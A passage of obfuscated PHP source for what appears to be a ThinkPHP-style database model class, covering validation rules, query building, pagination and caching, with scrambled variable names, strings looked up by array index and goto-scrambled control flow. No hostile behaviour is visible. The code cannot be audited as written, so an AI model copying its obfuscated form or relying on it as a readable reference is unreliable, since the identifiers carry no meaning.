$_SERVER[©]; if (!empty($this->options[$dÙš¢ĞŞÓš[322]])) { $dÇœ“óŠ´ = $this->options[$dÙš¢ĞŞÓš[322]]; unset($this->options[$dÙš¢ĞŞÓš[322]]); } elseif (!empty($this->_validate)) { $dÇœ“óŠ´ = $this->_validate; } if (isset($dÇœ“óŠ´)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dÇœ“óŠ´ as $Aê³’İ™ªÉ => $bœîÙ…½†‰) { if (empty($bœîÙ…½†‰[5]) || $bœîÙ…½†‰[5] == THINK_MODEL_BOTH || $bœîÙ…½†‰[5] == $A¤•Á¥å¯ˆ) { if (0 == strpos($bœîÙ…½†‰[2], $dÙš¢ĞŞÓš[323]) && strpos($bœîÙ…½†‰[2], $dÙš¢ĞŞÓš[324])) { $bœîÙ…½†‰[2] = think_lang(substr($bœîÙ…½†‰[2], 2, -1)); } $bœîÙ…½†‰[3] = isset($bœîÙ…½†‰[3]) ? $bœîÙ…½†‰[3] : THINK_EXISTS_VALIDATE; $bœîÙ…½†‰[4] = isset($bœîÙ…½†‰[4]) ? $bœîÙ…½†‰[4] : $dÙš¢ĞŞÓš[325]; switch ($bœîÙ…½†‰[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($cÁ¿Ãóƒ…¥, $bœîÙ…½†‰)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($dÙš¢ĞŞÓš[43] != trim($cÁ¿Ãóƒ…¥[$bœîÙ…½†‰[0]])) { if (!1 === $this->_validationField($cÁ¿Ãóƒ…¥, $bœîÙ…½†‰)) { return !1; } } break; default: if (isset($cÁ¿Ãóƒ…¥[$bœîÙ…½†‰[0]])) { if (!1 === $this->_validationField($cÁ¿Ãóƒ…¥, $bœîÙ…½†‰)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($a³¶µ–‹˜², $FùŒö˜Ş¶Ã) { if (!1 === $this->_validationFieldItem($a³¶µ–‹˜², $FùŒö˜Ş¶Ã)) { if ($this->patchValidate) { $this->error[$FùŒö˜Ş¶Ã[0]] = $FùŒö˜Ş¶Ã[2]; } else { $this->error = $FùŒö˜Ş¶Ã[2]; return !1; } } return; } protected function _validationFieldItem($b…ó¸¼ôï¸, $a÷¦´±æµ„) { $cù×öì“Ëï =& $_SERVER[©]; switch (strtolower(trim($a÷¦´±æµ„[4]))) { case $cù×öì“Ëï[318]: case $cù×öì“Ëï[319]: $CÔÈë¹‰“ = isset($a÷¦´±æµ„[6]) ? (array) $a÷¦´±æµ„[6] : array(); if (is_string($a÷¦´±æµ„[0]) && strpos($a÷¦´±æµ„[0], $cù×öì“Ëï[57])) { $a÷¦´±æµ„[0] = explode($cù×öì“Ëï[57], $a÷¦´±æµ„[0]); } if (is_array($a÷¦´±æµ„[0])) { foreach ($a÷¦´±æµ„[0] as $D†¬’Ï»„) { $B«™›æ¦È÷[$D†¬’Ï»„] = $b…ó¸¼ôï¸[$D†¬’Ï»„]; } array_unshift($CÔÈë¹‰“, $B«™›æ¦È÷); } else { array_unshift($CÔÈë¹‰“, $b…ó¸¼ôï¸[$a÷¦´±æµ„[0]]); } if ($cù×öì“Ëï[318] == $a÷¦´±æµ„[4]) { return call_user_func_array($a÷¦´±æµ„[1], $CÔÈë¹‰“); } else { return call_user_func_array(array(&$this, $a÷¦´±æµ„[1]), $CÔÈë¹‰“); } case $cù×öì“Ëï[326]: return $b…ó¸¼ôï¸[$a÷¦´±æµ„[0]] == $b…ó¸¼ôï¸[$a÷¦´±æµ„[1]]; case $cù×öì“Ëï[327]: if (is_string($a÷¦´±æµ„[0]) && strpos($a÷¦´±æµ„[0], $cù×öì“Ëï[57])) { $a÷¦´±æµ„[0] = explode($cù×öì“Ëï[57], $a÷¦´±æµ„[0]); } $dùŞœæ¸‹² = array(); if (is_array($a÷¦´±æµ„[0])) { foreach ($a÷¦´±æµ„[0] as $D†¬’Ï»„) { $dùŞœæ¸‹²[$D†¬’Ï»„] = $b…ó¸¼ôï¸[$D†¬’Ï»„]; } } else { $dùŞœæ¸‹²[$a÷¦´±æµ„[0]] = $b…ó¸¼ôï¸[$a÷¦´±æµ„[0]]; } if (!empty($b…ó¸¼ôï¸[$this->getPk()])) { $dùŞœæ¸‹²[$this->getPk()] = array($cù×öì“Ëï[328], $b…ó¸¼ôï¸[$this->getPk()]); } if ($this->where($dùŞœæ¸‹²)->find()) { return !1; } return !0; default: return $this->check($b…ó¸¼ôï¸[$a÷¦´±æµ„[0]], $a÷¦´±æµ„[1], $a÷¦´±æµ„[4]); } } public function check($dâ‰¸‚ÄõÒ, $Cç««ĞÚøŒ, $FÊïÜÓ“ä­ = "\162\145\x67\145\170") { $fâÔÆß÷ì± =& $_SERVER[©]; $FÊïÜÓ“ä­ = strtolower(trim($FÊïÜÓ“ä­)); switch ($FÊïÜÓ“ä­) { case $fâÔÆß÷ì±[17]: case $fâÔÆß÷ì±[329]: $F÷†•ëÜ‡Ö = is_array($Cç««ĞÚøŒ) ? $Cç««ĞÚøŒ : explode($fâÔÆß÷ì±[57], $Cç««ĞÚøŒ); return $FÊïÜÓ“ä­ == $fâÔÆß÷ì±[17] ? in_array($dâ‰¸‚ÄõÒ, $F÷†•ëÜ‡Ö) : !in_array($dâ‰¸‚ÄõÒ, $F÷†•ëÜ‡Ö); case $fâÔÆß÷ì±[330]: case $fâÔÆß÷ì±[331]: if (is_array($Cç««ĞÚøŒ)) { $d¸ä¼Ã‰‰ = $Cç««ĞÚøŒ[0]; $f±ŞÒ”ÇÕ‹ = $Cç««ĞÚøŒ[1]; } else { list($d¸ä¼Ã‰‰, $f±ŞÒ”ÇÕ‹) = explode($fâÔÆß÷ì±[57], $Cç««ĞÚøŒ); } return $FÊïÜÓ“ä­ == $fâÔÆß÷ì±[330] ? $dâ‰¸‚ÄõÒ >= $d¸ä¼Ã‰‰ && $dâ‰¸‚ÄõÒ <= $f±ŞÒ”ÇÕ‹ : $dâ‰¸‚ÄõÒ < $d¸ä¼Ã‰‰ || $dâ‰¸‚ÄõÒ > $f±ŞÒ”ÇÕ‹; case $fâÔÆß÷ì±[332]: case $fâÔÆß÷ì±[333]: return $FÊïÜÓ“ä­ == $fâÔÆß÷ì±[332] ? $dâ‰¸‚ÄõÒ == $Cç««ĞÚøŒ : $dâ‰¸‚ÄõÒ != $Cç««ĞÚøŒ; case $fâÔÆß÷ì±[334]: $CÉèœÊ­´ = mb_strlen($dâ‰¸‚ÄõÒ, $fâÔÆß÷ì±[335]); if (strpos($Cç««ĞÚøŒ, $fâÔÆß÷ì±[57])) { list($d¸ä¼Ã‰‰, $f±ŞÒ”ÇÕ‹) = explode($fâÔÆß÷ì±[57], $Cç««ĞÚøŒ); return $CÉèœÊ­´ >= $d¸ä¼Ã‰‰ && $CÉèœÊ­´ <= $f±ŞÒ”ÇÕ‹; } else { return $CÉèœÊ­´ == $Cç««ĞÚøŒ; } case $fâÔÆß÷ì±[336]: list($e„›‰±»ğ¿, $F½á±µÌ¯) = explode($fâÔÆß÷ì±[57], $Cç««ĞÚøŒ); if (!is_numeric($e„›‰±»ğ¿)) { $e„›‰±»ğ¿ = strtotime($e„›‰±»ğ¿); } if (!is_numeric($F½á±µÌ¯)) { $F½á±µÌ¯ = strtotime($F½á±µÌ¯); } return NOW_TIME >= $e„›‰±»ğ¿ && NOW_TIME <= $F½á±µÌ¯; case $fâÔÆß÷ì±[337]: return in_array(get_client_ip(), explode($fâÔÆß÷ì±[57], $Cç««ĞÚøŒ)); case $fâÔÆß÷ì±[338]: return !in_array(get_client_ip(), explode($fâÔÆß÷ì±[57], $Cç««ĞÚøŒ)); case $fâÔÆß÷ì±[325]: default: return $this->regex($dâ‰¸‚ÄõÒ, $Cç««ĞÚøŒ); } } public function query($Bóœ­º®æ, $eÂáì‡·ƒ¬ = false) { $F×ƒ·¾ñ¿¹ =& $_SERVER[©]; if (!is_bool($eÂáì‡·ƒ¬) && !is_array($eÂáì‡·ƒ¬)) { $eÂáì‡·ƒ¬ = func_get_args(); array_shift($eÂáì‡·ƒ¬); } $Bóœ­º®æ = str_replace(array($F×ƒ·¾ñ¿¹[9], $F×ƒ·¾ñ¿¹[339]), $F×ƒ·¾ñ¿¹[60], $Bóœ­º®æ); $Bóœ­º®æ = $this->parseSql($Bóœ­º®æ, $eÂáì‡·ƒ¬); return $this->db->query($Bóœ­º®æ); } public function execute($BÇÀçŒá°õ, $aÒà¼†®Ô“ = false) { if (!is_bool($aÒà¼†®Ô“) && !is_array($aÒà¼†®Ô“)) { $aÒà¼†®Ô“ = func_get_args(); array_shift($aÒà¼†®Ô“); } $BÇÀçŒá°õ = $this->parseSql($BÇÀçŒá°õ, $aÒà¼†®Ô“); return $this->db->execute($BÇÀçŒá°õ); } protected function parseSql($b‘ĞÛˆ©å™, $CàÛ•¦áÈ‡) { $dÖëÜËù‘‡ =& $_SERVER[©]; if (!0 === $CàÛ•¦áÈ‡) { $bÚš©‚Ä‹ª = $this->_parseOptions(); $b‘ĞÛˆ©å™ = $this->db->parseSql($b‘ĞÛˆ©å™, $bÚš©‚Ä‹ª); } elseif (is_array($CàÛ•¦áÈ‡)) { $CàÛ•¦áÈ‡ = array_map(array($this->db, $dÖëÜËù‘‡[340]), $CàÛ•¦áÈ‡); $b‘ĞÛˆ©å™ = vsprintf($b‘ĞÛˆ©å™, $CàÛ•¦áÈ‡); } else { $b‘ĞÛˆ©å™ = strtr($b‘ĞÛˆ©å™, array($dÖëÜËù‘‡[341] => $this->getTableName(), $dÖëÜËù‘‡[342] => think_config($dÖëÜËù‘‡[241]))); } $this->db->setModel($this->name); return $b‘ĞÛˆ©å™; } public function db($DÅØŠÌ¶Ò† = '', $E–Òå¼¼¨ = '', $f ©éÑ¼³Ï = array()) { goto A¿ëß³ˆÛ¦; A¿ëß³ˆÛ¦: $CĞ»„ŠÈõ³ =& $_SERVER[©]; if ($CĞ»„ŠÈõ³[43] === $DÅØŠÌ¶Ò† && $this->db) { return $this->db; } static $a„Ã®¯ß‰™ = array(); goto eÇ÷Ñàƒë; c÷ÉÖâö±ˆ: $a„Ã®¯ß‰™[$DÅØŠÌ¶Ò†] = $E–Òå¼¼¨; $this->db = $b×àÂ¼Öİó[$DÅØŠÌ¶Ò†]; $this->_after_db(); goto aäöÓÇççÌ; aäöÓÇççÌ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto FÄÎŒŒÊåí; eÇ÷Ñàƒë: static $b×àÂ¼Öİó = array(); if (!isset($b×àÂ¼Öİó[$DÅØŠÌ¶Ò†]) || isset($b×àÂ¼Öİó[$DÅØŠÌ¶Ò†]) && $E–Òå¼¼¨ && $a„Ã®¯ß‰™[$DÅØŠÌ¶Ò†] != $E–Òå¼¼¨) { if (!empty($E–Òå¼¼¨) && is_string($E–Òå¼¼¨) && !1 === strpos($E–Òå¼¼¨, $CĞ»„ŠÈõ³[18])) { $E–Òå¼¼¨ = think_config($E–Òå¼¼¨); } $b×àÂ¼Öİó[$DÅØŠÌ¶Ò†] = Db::getInstance($E–Òå¼¼¨); } elseif (NULL === $E–Òå¼¼¨) { $b×àÂ¼Öİó[$DÅØŠÌ¶Ò†]->close(); unset($b×àÂ¼Öİó[$DÅØŠÌ¶Ò†]); return; } if (!empty($f ©éÑ¼³Ï)) { if (is_string($f ©éÑ¼³Ï)) { parse_str($f ©éÑ¼³Ï, $f ©éÑ¼³Ï); } foreach ($f ©éÑ¼³Ï as $AĞ±¼¯†šŞ => $D¨ÍšÙ×¬Ù) { $this->setProperty($AĞ±¼¯†šŞ, $D¨ÍšÙ×¬Ù); } } goto c÷ÉÖâö±ˆ; FÄÎŒŒÊåí: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $DÜ‘–¤ƒì = get_class($this); if ($DÜ‘–¤ƒì == $_SERVER[©][343]) { return $this->name; } $this->name = substr($DÜ‘–¤ƒì, 0, -5); } return $this->name; } public function getTableName() { $EÓÈùÚ² ˜ =& $_SERVER[©]; if (empty($this->trueTableName)) { $fË”ˆ‘®™ = !empty($this->tablePrefix) ? $this->tablePrefix : $EÓÈùÚ² ˜[43]; if (!empty($this->tableName)) { $fË”ˆ‘®™ .= $this->tableName; } else { $fË”ˆ‘®™ .= think_parse_name($this->name); } $this->trueTableName = strtolower($fË”ˆ‘®™); } return (!empty($this->dbName) ? $this->dbName . $EÓÈùÚ² ˜[101] : $EÓÈùÚ² ˜[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $F§Ÿ§”•š =& $_SERVER[©]; return isset($this->fields[$F§Ÿ§”•š[248]]) ? $this->fields[$F§Ÿ§”•š[248]] : $this->pk; } public function getDbFields() { $FÎî†Ï¢ë =& $_SERVER[©]; if (isset($this->options[$FÎî†Ï¢ë[276]])) { $e˜çŞå˜ = $this->db->getFields($this->options[$FÎî†Ï¢ë[276]]); return $e˜çŞå˜ ? array_keys($e˜çŞå˜) : !1; } if ($this->fields) { $e˜çŞå˜ = $this->fields; unset($e˜çŞå˜[$FÎî†Ï¢ë[247]], $e˜çŞå˜[$FÎî†Ï¢ë[248]], $e˜çŞå˜[$FÎî†Ï¢ë[249]], $e˜çŞå˜[$FÎî†Ï¢ë[246]]); return $e˜çŞå˜; } return !1; } public function data($c“ÎíŒĞƒ· = '') { $AÏ¸‰ÍŠ‘ =& $_SERVER[©]; if ($AÏ¸‰ÍŠ‘[43] === $c“ÎíŒĞƒ· && !empty($this->data)) { return $this->data; } if (is_object($c“ÎíŒĞƒ·)) { $c“ÎíŒĞƒ· = get_object_vars($c“ÎíŒĞƒ·); } elseif (is_string($c“ÎíŒĞƒ·)) { parse_str($c“ÎíŒĞƒ·, $c“ÎíŒĞƒ·); } elseif (!is_array($c“ÎíŒĞƒ·)) { think_exception(think_lang($AÏ¸‰ÍŠ‘[268])); } $this->data = $c“ÎíŒĞƒ·; return $this; } public function join($C™‡Ş–Ç) { $dÑ‚æéØÑ£ =& $_SERVER[©]; if (is_array($C™‡Ş–Ç)) { $this->options[$dÑ‚æéØÑ£[279]] = $C™‡Ş–Ç; } elseif (!empty($C™‡Ş–Ç)) { $this->options[$dÑ‚æéØÑ£[279]][] = $C™‡Ş–Ç; } return $this; } public function union($FÓÀ¬‘¯¯ô, $fÍ°Å¬©„Ï = false) { goto Cˆá£Œª§ø; aàâ¢ó¨‘: if (is_object($FÓÀ¬‘¯¯ô)) { $FÓÀ¬‘¯¯ô = get_object_vars($FÓÀ¬‘¯¯ô); } if (is_string($FÓÀ¬‘¯¯ô)) { $fä’äØ¡ŒÎ = $FÓÀ¬‘¯¯ô; } elseif (is_array($FÓÀ¬‘¯¯ô)) { if (isset($FÓÀ¬‘¯¯ô[0])) { $this->options[$e·÷Ò¿ë„ƒ[344]] = array_merge($this->options[$e·÷Ò¿ë„ƒ[344]], $FÓÀ¬‘¯¯ô); return $this; } else { $fä’äØ¡ŒÎ = $FÓÀ¬‘¯¯ô; } } else { think_exception(think_lang($e·÷Ò¿ë„ƒ[268])); } $this->options[$e·÷Ò¿ë„ƒ[344]][] = $fä’äØ¡ŒÎ; goto a……èìÁº‡; Cˆá£Œª§ø: $e·÷Ò¿ë„ƒ =& $_SERVER[©]; if (empty($FÓÀ¬‘¯¯ô)) { return $this; } if ($fÍ°Å¬©„Ï) { $this->options[$e·÷Ò¿ë„ƒ[344]][$e·÷Ò¿ë„ƒ[345]] = !0; } goto aàâ¢ó¨‘; a……èìÁº‡: return $this; goto F’Êè“¿õÍ; F’Êè“¿õÍ: } public function cache($aœíÖØÊˆ = true, $Aê‡öß÷¹Î = null, $Fâİªà¤®‰ = '') { $AÅòô÷ƒ˜ï =& $_SERVER[©]; if (!1 !== $aœíÖØÊˆ) { $this->options[$AÅòô÷ƒ˜ï[346]] = array($AÅòô÷ƒ˜ï[99] => $aœíÖØÊˆ, $AÅòô÷ƒ˜ï[336] => $Aê‡öß÷¹Î, $AÅòô÷ƒ˜ï[39] => $Fâİªà¤®‰); } return $this; } public function field($Cªƒ¢áŒ—ä, $bó¹Õîï¬ì = false) { $D ¡ÌÄ®Ş =& $_SERVER[©]; if (!0 === $Cªƒ¢áŒ—ä) { $C„ƒÀŒÌİ = $this->getDbFields(); $Cªƒ¢áŒ—ä = $C„ƒÀŒÌİ ? $C„ƒÀŒÌİ : $D ¡ÌÄ®Ş[186]; } elseif ($bó¹Õîï¬ì) { if (is_string($Cªƒ¢áŒ—ä)) { $Cªƒ¢áŒ—ä = explode($D ¡ÌÄ®Ş[57], $Cªƒ¢áŒ—ä); } $C„ƒÀŒÌİ = $this->getDbFields(); $Cªƒ¢áŒ—ä = $C„ƒÀŒÌİ ? array_diff($C„ƒÀŒÌİ, $Cªƒ¢áŒ—ä) : $Cªƒ¢áŒ—ä; } $this->options[$D ¡ÌÄ®Ş[270]] = $Cªƒ¢áŒ—ä; return $this; } public function scope($FöØˆÆ”Îµ = '', $A®¡”³É—Ÿ = NULL) { $Eç¯ÅÂ¯Í· =& $_SERVER[©]; if ($Eç¯ÅÂ¯Í·[43] === $FöØˆÆ”Îµ) { if (isset($this->_scope[$Eç¯ÅÂ¯Í·[44]])) { $A·«äÙó«› = $this->_scope[$Eç¯ÅÂ¯Í·[44]]; } else { return $this; } } elseif (is_string($FöØˆÆ”Îµ)) { $E³·°¹ÆÙŠ = explode($Eç¯ÅÂ¯Í·[57], $FöØˆÆ”Îµ); $A·«äÙó«› = array(); foreach ($E³·°¹ÆÙŠ as $C””–È¦´) { if (!isset($this->_scope[$C””–È¦´])) { continue; } $A·«äÙó«› = array_merge($A·«äÙó«›, $this->_scope[$C””–È¦´]); } if (!empty($A®¡”³É—Ÿ) && is_array($A®¡”³É—Ÿ)) { $A·«äÙó«› = array_merge($A·«äÙó«›, $A®¡”³É—Ÿ); } } elseif (is_array($FöØˆÆ”Îµ)) { $A·«äÙó«› = $FöØˆÆ”Îµ; } if (is_array($A·«äÙó«›) && !empty($A·«äÙó«›)) { $this->options = array_merge($this->options, array_change_key_case($A·«äÙó«›)); } return $this; } public function where($e²˜Šª¡ãÍ, $c–°²†í = null) { $bÓÔÌëò‘ =& $_SERVER[©]; if (!is_null($c–°²†í) && is_string($e²˜Šª¡ãÍ)) { if (!is_array($c–°²†í)) { $c–°²†í = func_get_args(); array_shift($c–°²†í); } $c–°²†í = array_map(array($this->db, $bÓÔÌëò‘[340]), $c–°²†í); $e²˜Šª¡ãÍ = vsprintf($e²˜Šª¡ãÍ, $c–°²†í); } elseif (is_object($e²˜Šª¡ãÍ)) { $e²˜Šª¡ãÍ = get_object_vars($e²˜Šª¡ãÍ); } elseif (is_array($e²˜Šª¡ãÍ)) { foreach ($e²˜Šª¡ãÍ as $B¹ÂæŒ¯« => $bŸ…Á…Ñ‡ë) { if ((is_numeric($B¹ÂæŒ¯«) || !$B¹ÂæŒ¯«) && is_string($bŸ…Á…Ñ‡ë)) { think_trace($bÓÔÌëò‘[347], $bÓÔÌëò‘[43], $bÓÔÌëò‘[56]); die; } } } if (is_string($e²˜Šª¡ãÍ) && $bÓÔÌëò‘[43] != $e²˜Šª¡ãÍ) { $cÉ½‰±©¥‹ = array(); $cÉ½‰±©¥‹[$bÓÔÌëò‘[348]] = $e²˜Šª¡ãÍ; $e²˜Šª¡ãÍ = $cÉ½‰±©¥‹; } if (isset($this->options[$bÓÔÌëò‘[272]])) { $this->options[$bÓÔÌëò‘[272]] = array_merge($this->options[$bÓÔÌëò‘[272]], $e²˜Šª¡ãÍ); } else { $this->options[$bÓÔÌëò‘[272]] = $e²˜Šª¡ãÍ; } return $this; } public function limit($F¡ÛÎÇš‰Ÿ, $D¬Íî…À®Ò = null) { $cõ²æÏ¶ßó =& $_SERVER[©]; $this->options[$cõ²æÏ¶ßó[289]] = is_null($D¬Íî…À®Ò) ? $F¡ÛÎÇš‰Ÿ : $F¡ÛÎÇš‰Ÿ . $cõ²æÏ¶ßó[57] . $D¬Íî…À®Ò; return $this; } public function page($eß·±¡¼ˆ´, $c…‰Í–Â®Ø = null) { $d¨»»‹˜×ï =& $_SERVER[©]; $this->options[$d¨»»‹˜×ï[349]] = is_null($c…‰Í–Â®Ø) ? $eß·±¡¼ˆ´ : $eß·±¡¼ˆ´ . $d¨»»‹˜×ï[57] . $c…‰Í–Â®Ø; return $this; } public function comment($eŠõ‰Æğ) { $this->options[$_SERVER[©][350]] = $eŠõ‰Æğ; return $this; } public function setProperty($dšã‹½‡¢‹, $Aˆª¨¸Á³Ä) { if (property_exists($this, $dšã‹½‡¢‹)) { $this->{$dšã‹½‡¢‹} = $Aˆª¨¸Á³Ä; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\124\x69\155\x65", "\x74\151\x6d\145", "\151\x6e\163\x65\162\164\x2c\165\x70\144\x61\164\145", "\146\x75\x6e\x63\164\151\157\x6e"), array("\143\162\145\x61\164\x65\124\151\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\162\164", "\x66\x75\x6e\143\x74\x69\157\156")); public function setDataAuto($fíËÊä¸ï) { $this->dataAuto = $fíËÊä¸ï; } public function __construct($dÏë«ó†Í = '', $f¾ÙÜ…ÌŠÅ = '', $D‰ê„÷ëÁ„ = '') { parent::__construct($dÏë«ó†Í, $f¾ÙÜ…ÌŠÅ, $D‰ê„÷ëÁ„); } public static function textEncode($c¯½¨ì­‚å) { if (!$c¯½¨ì­‚å) { return $c¯½¨ì­‚å; } $bÂãßˆÛ»‰ = json_encode($c¯½¨ì­‚å); $bÂãßˆÛ»‰ = preg_replace_callback($_SERVER[©][351], function ($b´šØÇÏ) { return addslashes($b´šØÇÏ[0]); }, $bÂãßˆÛ»‰); return json_decode($bÂãßˆÛ»‰); } public static function textDecode($A—ßˆ—ë‰Ô) { $EÚ¹¹ñ¼¼ =& $_SERVER[©]; $E÷§ë°×æ‘ = json_encode($A—ßˆ—ë‰Ô); $E÷§ë°×æ‘ = preg_replace_callback($EÚ¹¹ñ¼¼[352], function ($EôÂ §»°‰) { return $_SERVER[©][103]; }, $E÷§ë°×æ‘); return json_decode($E÷§ë°×æ‘); } protected $tableMeta = array(); protected function _beforeInsert(&$Dëù¼‰ˆ§÷, $dŒ‘®ÔÈ¹É) { $DŠÖÔ¼¦Ã˜ =& $_SERVER[©]; if (!$this->checkDataAutoHas($DŠÖÔ¼¦Ã˜[353])) { return; } $this->dataBeforeFilter($Dëù¼‰ˆ§÷, $DŠÖÔ¼¦Ã˜[353]); } protected function _beforeUpdate(&$bÜáö‘ìá, $bÆ“ “‚‘â) { $AÊ©Õå¼ÓÔ =& $_SERVER[©]; if (!$this->checkDataAutoHas($AÊ©Õå¼ÓÔ[354])) { return; } $this->dataBeforeFilter($bÜáö‘ìá, $AÊ©Õå¼ÓÔ[354]); } protected function _afterSelect(&$f¦‰öö‡, $B¶²ç¶Íäš) { if (!is_array($f¦‰öö‡)) { return; } if (!$this->checkDataAutoHas($_SERVER[©][355])) { return; } foreach ($f¦‰öö‡ as &$b›Ö×ŸÊ) { $this->dataAfterFilter($b›Ö×ŸÊ); } } protected function _afterFind(&$EÚËáã¦ÃÉ, $f²ÆĞ¯‹³™) { if (!is_array($EÚËáã¦ÃÉ)) { return; } if (!$this->checkDataAutoHas($_SERVER[©][355])) { return; } $this->dataAfterFilter($EÚËáã¦ÃÉ); } public function setAutoIncrement($eİ¸î±ïø¡) { $E‹Úî‹Š = array($this->getPk() => $eİ¸î±ïø¡); $Eƒ±¿œ‚‹‡ = $this->data($E‹Úî‹Š)->add(); if ($Eƒ±¿œ‚‹‡) { $this->delete($Eƒ±¿œ‚‹‡); } } public function getAutoIncrement() { $EÑâ‘§ÒÂ = $this->getTableName(); $E²„ëÂÊ—Ã = $this->max($this->getPk()); $b„‚œ‚×²æ = $this->query("\x73\x68\x6f\x77\40\164\141\x62\x6c\x65\40\163\x74\x61\164\x75\x73\x20\167\150\145\x72\x65\x20\116\x61\155\145\75\47{$EÑâ‘§ÒÂ}\47"); $féÖùÚ›ŞÕ = $b„‚œ‚×²æ[0][$_SERVER[©][356]]; $a³À¹õ­ŒÖ = max($E²„ëÂÊ—Ã, $féÖùÚ›ŞÕ); return $a³À¹õ­ŒÖ; } protected function _callBefore($f‚‚Í†Î, $C±’ó—ºÄ) { return $this->cacheCallCheck($f‚‚Í†Î, $C±’ó—ºÄ, !1); } protected function _callAfter($dòš—·„Èã, $d“Ñ‹â‘ê») { return $this->cacheCallCheck($dòš—·„Èã, $d“Ñ‹â‘ê», !0); } protected function cacheFunctionAlias($cŒ ê›”¥…) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($fàÆÎ¥Áëª, $aÛ‹éìÈÖĞ, $CæÀËÏœ¹ = false) { $AŒŒ±·ˆ“¤ = $this->cacheFunctionAlias($aÛ‹éìÈÖĞ); if (!$AŒŒ±·ˆ“¤) { return; } foreach ($AŒŒ±·ˆ“¤ as $aÉ…¢›ø‚· => $D…¾ÃÖßó) { $B‹ˆí“öº = $D…¾ÃÖßó[0]; $AØĞé‹“Ô = explode($_SERVER[©][57], $D…¾ÃÖßó[1]); if ($fàÆÎ¥Áëª == $aÉ…¢›ø‚·) { return $this->cacheFunctionGet($aÉ…¢›ø‚·, $B‹ˆí“öº); } if ($CæÀËÏœ¹ && in_array($fàÆÎ¥Áëª, $AØĞé‹“Ô)) { $this->cacheFunctionClear($aÉ…¢›ø‚·, $B‹ˆí“öº); } } } public function cacheFunctionGet($AÕ‹™‚”¦, $fÃˆï¶¿ç‰) { $FìÃêÚ¼¾‡ = $this->cacheKeyMake($AÕ‹™‚”¦, $fÃˆï¶¿ç‰); $b÷¨º“…˜Ë = Cache::get($FìÃêÚ¼¾‡); if (!is_array($b÷¨º“…˜Ë)) { $b÷¨º“…˜Ë = call_user_func_array(array($this, $AÕ‹™‚”¦), array($fÃˆï¶¿ç‰, !0)); Cache::set($FìÃêÚ¼¾‡, $b÷¨º“…˜Ë); } return $b÷¨º“…˜Ë; } public function cacheFunctionClear($CåëÀøº¶Å, $f·šßØì) { $CìÒ‡âö„ = $f·šßØì; if (!is_array($f·šßØì)) { $CìÒ‡âö„ = array($f·šßØì); } foreach ($CìÒ‡âö„ as $e÷¯ˆŠÍæß) { $b¼Œ´®‚Ï™ = $this->cacheKeyMake($CåëÀøº¶Å, $e÷¯ˆŠÍæß); Cache::remove($b¼Œ´®‚Ï™); } } private function cacheKeyMake($EÕæ‰Õ¢Ü”, $c´¸¬ĞÅ‰÷) { $bĞ„¾ô©¦§ =& $_SERVER[©]; return get_class($this) . $bĞ„¾ô©¦§[80] . $EÕæ‰Õ¢Ü” . $bĞ„¾ô©¦§[357] . $c´¸¬ĞÅ‰÷; } protected function selectPage($c…ÒÓ‰ˆ°Õ = 200, $eºÛ…šõÍÇ = 1) { goto C‡µÂˆ¾Ö´; E¼¬—Šóãµ: $dÍœ’ºÆ = intval($this->count()); $c…ÒÓ‰ˆ°Õ = intval($c…ÒÓ‰ˆ°Õ); $c…ÒÓ‰ˆ°Õ = $c…ÒÓ‰ˆ°Õ <= 5 ? 5 : ($c…ÒÓ‰ˆ°Õ >= $B‘ª»çº˜• ? $B‘ª»çº˜• : $c…ÒÓ‰ˆ°Õ); goto fãÁÆù„…¨; fãÁÆù„…¨: $b†Øœ–ÁÏŠ = ceil($dÍœ’ºÆ / $c…ÒÓ‰ˆ°Õ); $eºÛ…šõÍÇ = intval(isset($in[$Aåô†¥ß¸µ[349]]) ? $in[$Aåô†¥ß¸µ[349]] : $eºÛ…šõÍÇ); $eºÛ…šõÍÇ = $eºÛ…šõÍÇ <= 1 ? 1 : ($eºÛ…šõÍÇ >= $b†Øœ–ÁÏŠ ? $b†Øœ–ÁÏŠ : $eºÛ…šõÍÇ); goto BÁŸá’¤‘; Aôƒí ÒœÁ: if ($b†Øœ–ÁÏŠ == 1) { $dÍœ’ºÆ = count($d³•Ûäˆµ¯); } $D˜ËÖ“¿äÜ = array($Aåô†¥ß¸µ[360] => array($Aåô†¥ß¸µ[361] => $dÍœ’ºÆ, $Aåô†¥ß¸µ[358] => $c…ÒÓ‰ˆ°Õ, $Aåô†¥ß¸µ[349] => $eºÛ…šõÍÇ, $Aåô†¥ß¸µ[362] => $b†Øœ–ÁÏŠ), $Aåô†¥ß¸µ[363] => $d³•Ûäˆµ¯ ? $d³•Ûäˆµ¯ : array()); return $D˜ËÖ“¿äÜ; goto dëá™óÂØŞ; CœÒ†˜­Ç¶: $DêÒáØëº = $CâØ»¢†èä; $DêÒáØëº[$Aåô†¥ß¸µ[359]] = array(); $this->optionsValue($DêÒáØëº); goto E¼¬—Šóãµ; Aõ¨ŠåÃ¢µ: $B‘ª»çº˜• = 4000; $c…ÒÓ‰ˆ°Õ = isset($in[$Aåô†¥ß¸µ[358]]) ? $in[$Aåô†¥ß¸µ[358]] : $c…ÒÓ‰ˆ°Õ; if ($c…ÒÓ‰ˆ°Õ === -1) { unset($in[$Aåô†¥ß¸µ[358]]); $B‘ª»çº˜• = 100000000; $c…ÒÓ‰ˆ°Õ = $B‘ª»çº˜•; } goto CœÒ†˜­Ç¶; BÁŸá’¤‘: $this->optionsValue($CâØ»¢†èä); $d³•Ûäˆµ¯ = $this->page($eºÛ…šõÍÇ, $c…ÒÓ‰ˆ°Õ)->select(); $d³•Ûäˆµ¯ = is_array($d³•Ûäˆµ¯) ? 